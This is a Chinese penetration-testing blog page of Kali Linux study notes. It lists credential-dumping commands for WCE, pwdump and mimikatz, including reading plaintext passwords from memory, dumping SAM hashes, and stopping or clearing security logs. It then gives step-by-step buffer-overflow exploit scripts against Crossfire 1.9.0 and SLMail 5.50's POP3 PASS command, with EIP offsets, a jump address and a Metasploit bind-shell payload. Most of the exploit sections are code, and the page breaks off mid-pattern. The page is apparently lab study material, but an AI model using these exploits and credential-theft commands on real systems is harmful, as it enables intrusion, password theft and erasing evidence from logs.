<li>需要管理员权限</li>
<li><strong><code>🔺命令：wce-universal.exe -l</code></strong>（显示当前系统已经登陆的会话账号）</li>
<li><strong><code>🔺命令：wce-universal.exe -lv</code></strong>（显示当前登陆会话的详细信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -d</code></strong> LUID（指定一个会话，然后删除）</li>
<li><strong><code>🔺命令：wce-universal.exe -e</code></strong>（指定刷新时间，登陆信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -r</code></strong>（每隔5s重新刷新一次登陆信息）</li>
<li><strong><code>🔺命令：wce-universal.exe -g password</code></strong>（计算LMHash和NTLMHash）</li>
<li><strong><code>🔺命令：wce-universal.exe -w</code></strong>（从内存中读取Digest Authentication Package中存的明文密码）</li>
<li><strong><code>🔺命令：wce-universal.exe -i LUID -s 登陆信息</code></strong>（进行交互式修改）</li>
<li>LM/NT hash</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>PWDUMP是从SAM Database中读取信息，WCE是从内存中读取信息</code></pre></blockquote>
<ol start="17">
<li><p>WCE（WINDOWS CREDENTIAL EDITOR）</p>
<ul>
<li>从内存中读取LM/NTLM hash</li>
<li>Digest Authentication Package</li>
<li>NTLM Security Package</li>
<li>Kerberos Security</li>
<li>防止WCE攻击</li>
<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package<ul>
<li>kerberos</li>
<li>msv1_0</li>
<li>schannet</li>
<li>wdigest（本地连接身份验证，被删除后，只允许单用户登陆）▲2019.12.19能单用户登陆</li>
<li>tspka（远程连接身份验证）</li>
<li>pku2u</li>
</ul>
</li>
</ul>
</li>
<li><p>其他工具</p>
<ul>
<li><strong><code>🔺命令：pwdump locahost</code></strong></li>
<li><strong><code>🔺命令：fgdump</code></strong>（/usr/share/windows-binaries/fgdump）<ul>
<li>双击会生成3个文件（调用cachedump/pwdump）</li>
</ul>
</li>
<li><strong><code>🔺命令：mimikatz.exe</code></strong>（/usr/share/windows-resources/minikatz）<ul>
<li>::（同 -h）</li>
<li>privilege::debug（提权到debug权限）</li>
<li>sekurlsa::logonPasswords（查看当前已经在登陆状态的会话信息）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>sekurlsa
1.kerberos域环境的账号密码信息
2.wdigest本地环境的明文信息
3.logonPassword登陆的所有信息
4.minidump最小形式的dump
5.pth hash值的形式登陆账号</code></pre></blockquote>
<blockquote>
<pre><code>process
1.list列出当前进程表
2.start/stop开启/结束一个进程
3.suspend/resume挂起/冻结一个进程（杀毒软件）</code></pre></blockquote>
<blockquote>
<pre><code>lsadump
1.sam SAM数据库进行DUMP
2.cache cache读取
3.lsa las读取
4.hash 哈希值读取</code></pre></blockquote>
<blockquote>
<pre><code>ts（终端服务）
1.multirdp（打上补丁，允许多个用户进行登陆）</code></pre></blockquote>
<blockquote>
<pre><code>event
1.drop（不再产生新的日志，登陆行为不会为记录在日志）
2.clear（清楚操作系统安全性日志）
3.eventvwr操作系统日志查看</code></pre></blockquote>
<blockquote>
<pre><code>Misc
1.cmd（启动一个cmd）
2.regedit（启动注册表）
3.taskmgr（启动任务管理器）
4.wifi（查看连接所有wifi的所有密码）</code></pre></blockquote>
<blockquote>
<pre><code>token
1.whoami（whoami和sid）
2.list（详细列出账号信息，名称，权限，SID）</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url">Kali Linux笔记(二十八)：Linux缓冲区溢出</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-13T20:00:34+08:00">
                2019-12-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>FUZZING</p>
<ul>
<li>Crossfire ▲ 2019.12.13实例未找到<ul>
<li>多人在线RPG在线</li>
<li>1.9.0版本接受入站socket连接时存在缓冲区溢出漏洞</li>
</ul>
</li>
<li>调试工具<ul>
<li>edb</li>
</ul>
</li>
<li>运行平台<ul>
<li>Kali i386虚拟机</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>crossfile进行安装：（工作端口：13327）
mv crossfire.tar.gz /usr/games
cd /usr/games
tar zxpf crossfire.tar.gz
cd crossfire/bin
./crossfire（缺少组件可自行安装）</code></pre></blockquote>
<blockquote>
<pre><code>64位操作系统难以进行缓冲区溢出，32位操作系统较容易进行缓冲区溢出
调试工具：Kali Linux → Reverse Engnieering → Debuggers → edb-degugger</code></pre></blockquote>
<ol start="2">
<li><p>FUZZING</p>
<ul>
<li>新版本Linux内核支持内存保护机制<ul>
<li>DEP</li>
<li>ASLR</li>
<li>堆栈cookies</li>
<li>堆栈粉碎</li>
</ul>
</li>
</ul>
</li>
<li><p>FUZZING</p>
<ul>
<li>本机调试（测试时，最好限制只能本机访问，怕有公网访问扫描）<ul>
<li><strong><code>🔺命令：iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP</code></strong></li>
<li><strong><code>🔺命令：iptables -A INPUT -p tcp --destiantion-port 13327\! -d 127.0.0.1 -j DROP</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><p>FUZZING</p>
<ul>
<li>解压<ul>
<li>/usr/games</li>
<li><strong><code>🔺命令：tar zxpf crossfire.tar.gz</code></strong></li>
</ul>
</li>
<li>调试<ul>
<li><strong><code>🔺命令：edb --run /usr/games/crossfire/bin/crossfire</code></strong></li>
<li>在界面Debug下run两次，才能开启edb命令行 → waiting for connection</li>
<li><strong><code>🔺命令：./01.py</code></strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;\x41&apos;*4379</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>crossfire只有在发生了固定大小的字节后，会发生缓冲区溢出，为4379位（4378，4380也可以发生缓冲区溢出，但无法精确修改EIP的参数）</code></pre></blockquote>
<ol start="5">
<li><p>FUZZING</p>
<ul>
<li>唯一字符串识别EIP精确位置<ul>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/pattern_create.rb 4379</code></strong></li>
<li><strong><code>🔺命令：./02.py</code></strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>唯一字符串识别EIP精确位置<ul>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/pattern_offset.rb EIP寄存器位置</code></strong></li>
<li><strong><code>🔺命令：./03.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>在此缓冲区溢出中，因为需要做到EIP缓冲区的精确溢出，所以长度固定为4379，意味着ESP的溢出长度只有7个字符，不适合做Shellcode的存放位置</code></pre></blockquote>
<ol start="6">
<li><p>FUZZING</p>
<ul>
<li>思路：</li>
<li>第一阶段Shellcode<ul>
<li>ESP跳转到EAX</li>
<li>偏移12个字节</li>
</ul>
</li>
<li>setup sound Shellcode2</li>
<li><strong><code>🔺命令：./usr/share/metasploit-framework/tools/nasm_shell.rb</code></strong><ul>
<li>add eax,12</li>
<li>jmp exa</li>
<li>\x83\xc0\x0c\xff\xe0\x90\x90（ESP必须是7个字符）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>EAX寄存器在不同时间，不同操作系统上的位置是变化的，只能通过系统固定模块去跳转，才能做到多台机器脚本的兼容性，参照windows缓冲区溢出的JMP ESP</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：./03.py</code></strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<pre><code>使用插件：Plugins → OpcodeSearcher → Opcode Search → (EIP→ESP)</code></pre></blockquote>
<ol start="7">
<li><p>FUZZING</p>
<ul>
<li>查找坏字符<ul>
<li>\x00\x0a\x0d\0x20</li>
</ul>
</li>
</ul>
</li>
<li><p>FUZZING</p>
<ul>
<li>ESP跳转地址<ul>
<li>Opcode search</li>
<li>crash=’\x41’*4368+’\x97\x45\x13\x08’+’\x83\xc0\x0c\xff\xe0\x90\x90’</li>
</ul>
</li>
<li>设置断点（0x08134597）<ul>
<li>EIP–08134597</li>
<li>jmp esp</li>
<li>add eax,12</li>
<li>jmp eax</li>
</ul>
</li>
<li><strong><code>🔺命令：./04.py</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">crash=&apos;\x41&apos;*4368+&apos;\x97\x45\x13\x08&apos;+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li><p>FUZZING</p>
<ul>
<li>./msfpayload linux/x86/shell_bind_tcp LPORT=4444 R | ./msfencode -b “\x00\x0a\x0d\0x20”</li>
<li><strong><code>🔺命令：./05.py</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">shellcode=()</span><br><span class="line">crash=shellcode+&apos;A&apos;*(4368-105)+&apos;\x97\x45\x13\x08&apos;+&apos;\x83\xc0\x0c\xff\xe0\x90\x90&apos;</span><br><span class="line">buffer=&quot;\x11(setup sound&quot; + crash +&quot;\x90\x00#&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*]Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13372))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url">Kali Linux笔记(二十七)：Window缓冲区溢出</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:18+08:00">
                2019-12-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>FUZZER（window缓存区溢出）</p>
<ul>
<li>SLMail 5.50 Mail Server（默认安装，About NT User Import，no instead）</li>
<li>ImmunityDebugger_1_85_setup.exe（要安装python2.7版本，不可3.0）</li>
<li>mona.py（Github上下载）</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>window上看开启的服务
1.netstat -nao（cmd）
2.services.msc（允许win+R）</code></pre></blockquote>
<blockquote>
<pre><code>mona.py放在ImmunityDebugger中
右键 → 查找目标 → PyCommonds → 拷贝mona.py</code></pre></blockquote>
<ol start="2">
<li><p>FUZZER</p>
<ul>
<li>SLMail 5.50 Mail Server（不同端口开的不同服务，都有不同指令可以向服务器提交数据）<ul>
<li>POP3 PASS命令存在缓存区溢出漏洞（nc SMTP or POP3,shell code进行试探)</li>
<li>无需身份验证实现远程代码执行</li>
<li>DEP：阻止代码从数据页被执行（CPU特性，通过操作系统软硬件实现，可绕过DEP）</li>
<li>ALSA：随机内存地址加载执行程序盒DDL，每次重启地址变化（动态内存地址分配，通过shell直接跳转到固定的内存地址，操作系统实现，在window vista之后加入）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>在Kali端，向右键服务器发送大量命令组合的字符串（如：USER;ls）
在window xp端，用ImmunityDebugger查看在发送命令时是否会出现缓冲区溢出</code></pre></blockquote>
<ol start="3">
<li>POP3<ul>
<li>nc IP地址 110端口</li>
<li>了解未知协议<ul>
<li>Wireshark（抓包分析学习）</li>
<li>标准RFC（查询协议的参数，进行学习）</li>
</ul>
</li>
<li><strong><code>🔺命令：./01.py</code></strong>（测试是否能连接POP3服务器）</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;USER yuanfh&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>FUZZING</p>
<ul>
<li>测试PASS命令接收到大量数据是否会溢出（需要发送的数据大于缓冲区）</li>
<li>EIP寄存器存放下一条指令的地址（首先关注EIP，ESP，EDP，可使指向shell code的地址）</li>
<li><strong><code>🔺命令：./02.py</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer=[&apos;A&apos;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;IP地址&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>ImmunityDebugger调试（记录程序的运行状态，为中间数据的拦截、记录）：
1.Open → 打开一个静态的exe文件
2.Attack → 正在运行的程序（通过PID区attack，attack会使进程停止，需点击开始）</code></pre></blockquote>
<ol start="5">
<li><p>FUZZING</p>
<ul>
<li>2700个字符实现EIP寄存器溢出</li>
<li><strong><code>🔺命令：./03.py</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>找到精确溢出的4个字节<ul>
<li>二分法</li>
<li>唯一字串法</li>
<li><strong><code>🔺命令：./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
<li><strong><code>🔺命令：./pattern_offset.rb EIP的4个十六进制数字</code></strong>（通过工具找到位置）</li>
<li><strong><code>🔺命令：./04.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5B